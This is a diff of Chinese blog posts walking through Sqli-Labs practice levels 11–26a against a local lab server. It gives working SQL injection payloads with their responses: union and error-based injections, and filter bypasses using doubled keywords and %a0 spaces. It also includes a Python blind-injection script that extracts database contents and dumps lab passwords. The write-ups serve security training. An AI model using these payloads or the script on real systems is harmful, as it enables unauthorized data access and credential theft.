+<p><a href="http://127.0.0.1/sql/Less-26a/?id=-100%27)union%a0select%a01,2,group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=%27users%27%26%26%a0" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=-100%27)union%a0select%a01,2,group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=%27users%27%26%26%a0</a>(%271</p>
+<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:id,username,password</p>
+<p>获取值：<br><a href="http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users</a>),(%273</p>
+<p>或者<br><a href="http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),3%26%26" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),3%26%26</a>(%271</p>
+<p>或者<br><a href="http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),3%26%26%271%27=" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),3%26%26%271%27=</a>(%271</p>
+<p>返回：<br>Welcome    Dhakkan<br>Your Login name:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4<br>Your Password:3</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/26/sqli-labs26a/" data-id="ck9sla34d0001pwh59a4n7jbd" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sqli-labs25a" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/26/sqli-labs25a/" class="article-date">
+  <time datetime="2020-04-26T01:59:42.074Z" itemprop="datePublished">2020-04-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/26/sqli-labs25a/">Sqli-Labs-Level25a学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="level-25a"><a href="#level-25a" class="headerlink" title="level-25a"></a>level-25a</h1><p><a href="http://127.0.0.1/sql/Less-25a/index.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=1</a> </p>
+<p>输入 and 1=1–<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=1%20and%201=1--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=1%20and%201=1--</a></p>
+<p>返回：<br>Hint: Your Input is Filtered with following result: 1 1=1–</p>
+<p>即and被过滤</p>
+<p>输入aandnd 1=1–<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=1%20aandnd%201=1--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=1%20aandnd%201=1--</a></p>
+<p>返回：<br>Hint: Your Input is Filtered with following result: 1 and 1=1–</p>
+<p>可见，对关键字只过滤了一次。</p>
+<p>输入<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=-1%20oorrorder%20by%203--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=-1%20oorrorder%20by%203--</a></p>
+<p>返回：<br>Hint: Your Input is Filtered with following result: -1 order by 3–</p>
+<p>输入<a href="http://127.0.0.1/sql/Less-25a/index.php?id=-1%20oorrorder%20by%204--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=-1%20oorrorder%20by%204--</a></p>
+<p>返回报错：</p>
+<p>Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in D:\phpStudy\PHPTutorial\WWW\sql\Less-25a\index.php on line 37</p>
+<p>得出字段为4</p>
+<p>输入：<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,3--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,3--</a></p>
+<p>返回：<br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:3</p>
+<p>输入：<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,database()--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,database()--</a><br>返回：<br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:security</p>
+<p>得出数据库为security</p>
+<p>输入：<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,(group_concat(table_name)%20from%20infoorrmation_schema.tables%20where%20table_schema=database())--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,(group_concat(table_name)%20from%20infoorrmation_schema.tables%20where%20table_schema=database())--</a></p>
+<p>则返回错误</p>
+<p>输入（少了个括号）：<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20infoorrmation_schema.tables%20where%20table_schema=database()--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20infoorrmation_schema.tables%20where%20table_schema=database()--</a></p>
+<p>返回正确：</p>
+<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:emails,referers,uagents,users</p>
+<p>输入<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20infoorrmation_schema.columns%20where%20table_name=&#39;users&#39;--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20infoorrmation_schema.columns%20where%20table_name=&#39;users&#39;--</a></p>
+<p>则返回错误</p>
+<p>输入(users转为ASCII)<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20infoorrmation_schema.columns%20where%20table_name=0x7573657273--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20infoorrmation_schema.columns%20where%20table_name=0x7573657273--</a></p>
+<p>返回正确：</p>
+<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:id,username,password</p>
+<p>获取密码<br><a href="http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,group_concat(passwoorrd)%20from%20users--" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25a/index.php?id=-1%20union%20select%201,2,group_concat(passwoorrd)%20from%20users--</a></p>
+<p>返回：<br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/26/sqli-labs25a/" data-id="ck9sla3460000pwh59hgob4if" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sqli-labs26" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/sqli-labs26/" class="article-date">
+  <time datetime="2020-04-06T05:56:40.762Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/sqli-labs26/">Sqli-Labs-Level26学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="level-26"><a href="#level-26" class="headerlink" title="level-26"></a>level-26</h1><p>创建日期 星期六 01 十二月 2018</p>
+<p><a href="http://127.0.0.1/sql/Less-26/index.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/index.php?id=1</a></p>
+<p><a href="http://127.0.0.1/sql/Less-26/index.php?id=1%27" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/index.php?id=1%27</a></p>
+<p>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in D:\phpStudy\PHPTutorial\WWW\sql\Less-26\index.php on line 36<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 1 LIMIT 0,1’ at line 1 </p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h3><p>payload（使用%a0代替空格）</p>
+<p><a href="http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27:%27,(select%20%a0database())),1)||%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27:%27,(select%20%a0database())),1)||%271%27=%271</a></p>
+<p>返回：<br>Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in D:\phpStudy\PHPTutorial\WWW\sql\Less-26\index.php on line 36<br>XPATH syntax error: ‘:security’</p>
+<h3 id="获取表"><a href="#获取表" class="headerlink" title="获取表"></a>获取表</h3><p>输入</p>
+<p><a href="http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27:%27,(group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database())),1)||%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27:%27,(group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database())),1)||%271%27=%271</a></p>
+<p>返回错误（少了个select）</p>
+<p>输入<br><a href="http://127.0.0.1/sql/Less-26/?id=0%27||updatexml(1,concat(%27$%27,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=%27security%27))),0)||%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=0%27||updatexml(1,concat(%27$%27,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=%27security%27))),0)||%271%27=%271</a></p>
+<p>返回：<br>Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in D:\phpStudy\PHPTutorial\WWW\sql\Less-26\index.php on line 36<br>Unknown XPATH variable at: ‘$emails,referers,uagents,users’</p>
+<p>得到 表</p>
+<p><a href="http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27$%27,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=%27security%27))),1)||%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27$%27,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=%27security%27))),1)||%271%27=%271</a></p>
+<p>也是可以得到表</p>
+<p><a href="http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27$%27,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))),1)||%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27$%27,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))),1)||%271%27=%271</a></p>
+<p>也是可以得到表</p>
+<h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><p><a href="http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27:%27,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=%27users%27))),1)||%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27:%27,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=%27users%27))),1)||%271%27=%271</a></p>
+<p>Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in D:\phpStudy\PHPTutorial\WWW\sql\Less-26\index.php on line 36<br>XPATH syntax error: ‘:id,username,password’</p>
+<p>也可以用：<br><a href="http://127.0.0.1/sql/Less-26/?id=-1%27||updatexml(1,concat(%27%%27,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=%27users%27))),1)||%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=-1%27||updatexml(1,concat(%27%%27,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=%27users%27))),1)||%271%27=%271</a></p>
+<h3 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h3><p><a href="http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27:%27,(select(group_concat(passwoorrd))from(users))),1)||%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=1%27||updatexml(1,concat(%27:%27,(select(group_concat(passwoorrd))from(users))),1)||%271%27=%271</a></p>
+<p>Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in D:\phpStudy\PHPTutorial\WWW\sql\Less-26\index.php on line 36<br>XPATH syntax error: ‘:Dumb,I-kill-you,p@ssword,crappy’</p>
+<h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h3 id="获取字段-1"><a href="#获取字段-1" class="headerlink" title="获取字段"></a>获取字段</h3><p><a href="http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,2,3%a0||%a0%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,2,3%a0||%a0%271%27=%271</a></p>
+<p>返回<br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:1</p>
+<p>或者<br><a href="http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,2,3%a0%26%26%a0%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,2,3%a0%26%26%a0%271%27=%271</a></p>
+<p>返回：<br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:1</p>
+<h3 id="获取数据库-1"><a href="#获取数据库-1" class="headerlink" title="获取数据库"></a>获取数据库</h3><p><a href="http://127.0.0.1/sql/Less-26/?id=0%27%a0union%a0select%a02,database(),4%a0||%a0%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=0%27%a0union%a0select%a02,database(),4%a0||%a0%271%27=%271</a></p>
+<p>或</p>
+<p><a href="http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,database(),3%a0%26%26%a0%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,database(),3%a0%26%26%a0%271%27=%271</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:security<br>Your Password:1</p>
+<h3 id="获取表-1"><a href="#获取表-1" class="headerlink" title="获取表"></a>获取表</h3><p><a href="http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,2,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,2,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0%271%27=%271</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:emails,referers,uagents,users</p>
+<p>或者<br><a href="http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0%271%27=%271" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26/?id=0%27union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0%271%27=%271</a></p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>可参考网上的一个脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def getPayload(char_index, ascii):</span><br><span class="line">    # database data</span><br><span class="line">    info_database_name &#x3D; &quot;infoorrmation_schema&quot;</span><br><span class="line">    info_table_name &#x3D; &quot;schemata&quot; # schemata &#x2F; tables &#x2F; columns</span><br><span class="line">    info_column_name &#x3D; &quot;schema_name&quot; # schema_name &#x2F; table_name &#x2F; column_name</span><br><span class="line">    </span><br><span class="line">    # data</span><br><span class="line">    database_name &#x3D; &quot;security&quot;</span><br><span class="line">    table_name &#x3D; &quot;users&quot;</span><br><span class="line">    column_name &#x3D; [&quot;id&quot;,&quot;username&quot;,&quot;passwoorrd&quot;]</span><br><span class="line">    </span><br><span class="line">    # url</span><br><span class="line">    start_str &#x3D; &quot;1&#39;%26%26&quot;</span><br><span class="line">    end_str &#x3D; &quot;||&#39;1&#39;&#x3D;&#39;&quot;</span><br><span class="line">    </span><br><span class="line">    # select</span><br><span class="line">    where_str &#x3D; &quot;&quot;</span><br><span class="line">    #where_str &#x3D; &quot;where(table_schema&#x3D;&#39;&quot;+database_name+&quot;&#39;%26%26table_name&#x3D;&#39;&quot;+table_name+&quot;&#39;)&quot;</span><br><span class="line">    select_str &#x3D; &quot;select(group_concat(&quot;+info_column_name+&quot;))from(&quot;+info_database_name+&quot;.&quot;+info_table_name+&quot;)&quot;+where_str</span><br><span class="line">    #select_str &#x3D; &quot;select(group_concat(concat_ws(&#39;$&#39;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;)))from(&quot;+table_name+&quot;)&quot;</span><br><span class="line">    </span><br><span class="line">    # payload</span><br><span class="line">    sqli_str &#x3D; &quot;(ascii(mid((&quot;+select_str+&quot;),&quot;+str(char_index)+&quot;,1))&gt;&quot;+str(ascii)+&quot;)&quot;</span><br><span class="line">    payload &#x3D; start_str + sqli_str + end_str</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">def execute(char_index, ascii):</span><br><span class="line">    # url</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-26&#x2F;?id&#x3D;&quot;</span><br><span class="line">    exec_url &#x3D; url + getPayload(char_index, ascii)</span><br><span class="line">    #print(exec_url)</span><br><span class="line">  </span><br><span class="line">    echo &#x3D; &quot;Your Login name&quot;</span><br><span class="line">    content &#x3D; requests.get(exec_url).text</span><br><span class="line">    if echo in content:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def dichotomy(char_index, left, right):</span><br><span class="line">    while left &lt; right:</span><br><span class="line">        # </span><br><span class="line">        ascii &#x3D; int((left+right)&#x2F;2)</span><br><span class="line">        if execute(str(char_index+1), str(ascii)):</span><br><span class="line">            left &#x3D; ascii</span><br><span class="line">        else:</span><br><span class="line">            right &#x3D; ascii</span><br><span class="line">        # </span><br><span class="line">        if left &#x3D;&#x3D; right-1:</span><br><span class="line">            if execute(str(char_index+1), str(ascii)):</span><br><span class="line">                ascii +&#x3D; 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">    return chr(ascii)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    for len in range(1024): #</span><br><span class="line">        char &#x3D; dichotomy(len, 30, 126) </span><br><span class="line">        if ord(char) &#x3D;&#x3D; 31: # </span><br><span class="line">            break</span><br><span class="line">        sys.stdout.write(char)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    sys.stdout.write(&quot;\r\n&quot;)</span><br><span class="line">    sys.stdout.flush()</span><br></pre></td></tr></table></figure>
+
+<p>执行结果：</p>
+<p>information_schema,challenges,mysql,performance_schema,phptest,security,test</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs26/" data-id="ck8o2c3c0001h8ch54wayeydi" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sqli-labs25" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/sqli-labs25/" class="article-date">
+  <time datetime="2020-04-06T05:56:19.368Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/sqli-labs25/">Sqli-Labs-Level25学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="level-25"><a href="#level-25" class="headerlink" title="level-25"></a>level-25</h1><p>创建日期 星期六 24 十一月 2018</p>
+<p>本关主要为or and过滤，如何绕过or和and过滤。一般性提供以下几种思路：</p>
+<p>大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/<em>or</em>/<br>利用符号 and=&amp;&amp; or=||<br>暂时只想到这些，还有的话可以补充。</p>
+<p>本关利用方法（4）进行。</p>
+<p><a href="http://127.0.0.1/sql/Less-25/index.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25/index.php?id=1</a></p>
+<p><a href="http://127.0.0.1/sql/Less-25/index.php?id=1%27||" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-25/index.php?id=1%27||</a> extractvalue(1,concat(0x7e,(select database()),0x7e))–+</p>
 <p>.\pasted_image.png</p>
-<p>账号输入 admin” and extractvalue(1,concat(0x7e,@@version,0x7e))#<br>密码任意</p>
-<p>.\pasted_image001.png</p>
-<p>账号输入 admin” and extractvalue(1,concat(0x7e,database(),0x7e))#<br>密码任意</p>
-<p>.\pasted_image002.png</p>
-<p>提交<br>uname=admin” and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=”security”),0x7e))#&amp;passwd=1&amp;submit=Submit<br>获取到security库的表：</p>
-<p>.\pasted_image003.png</p>
-<p>提交<br>uname=admin” and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))#&amp;passwd=1&amp;submit=Submit</p>
-<p>得到的结果显示不完整。</p>
-<p>.\pasted_image004.png</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs14/" data-id="ck8o2c3b500098ch5hm3q5ct9" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sqli-labs13" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs13/" class="article-date">
-  <time datetime="2020-04-06T05:44:30.264Z" itemprop="datePublished">2020-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs13/">Sqli-Labs-Level13学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h1><p>创建日期 星期日 18 十一月 2018</p>
-<p><a href="http://127.0.0.1/SQL/Less-13/index.php" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-13/index.php</a></p>
-<p>用户名admin’)#，密码任意，成功登录。</p>
-<p>.\pasted_image.png</p>
-<p>提交uname=admin’) and left(database(),1)&gt;’s’#&amp;passwd=1&amp;submit=Submit</p>
-<p>得到当为s时，返回<br>.\pasted_image001.png</p>
-<p>得到第一位为s,依次类推。</p>
-<p>uname=admin’) and left(database(),2)&gt;’se’#&amp;passwd=1&amp;submit=Submit<br>得到第二位为e</p>
-<p>uname=admin’) and left(database(),3)&gt;’sec’#&amp;passwd=1&amp;submit=Submit<br>得到第三位为c</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs13/" data-id="ck8o2c3b300068ch5b58i5c7r" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sqli-labs12" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs12/" class="article-date">
-  <time datetime="2020-04-06T05:43:29.842Z" itemprop="datePublished">2020-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs12/">Sqli-Labs-Level12学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h1><p>创建日期 星期日 18 十一月 2018</p>
-<p>基于错误，双引号。</p>
-<p><a href="http://127.0.0.1/SQL/Less-12/index.php" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-12/index.php</a></p>
-<p>输入用户名admin”， 密码任意。</p>
-<p>.\pasted_image.png</p>
-<p>用户名admin”)#，密码任意。</p>
-<p>.\pasted_image001.png</p>
-<p>同样使用admin”) order by 2# 得到字段为2 </p>
-<p>其余获取数据库内容同level-11。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs12/" data-id="ck8o2c3b100058ch54g9m8raz" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sqli-labs11" class="article article-type-post" itemscope itemprop="blogPost">
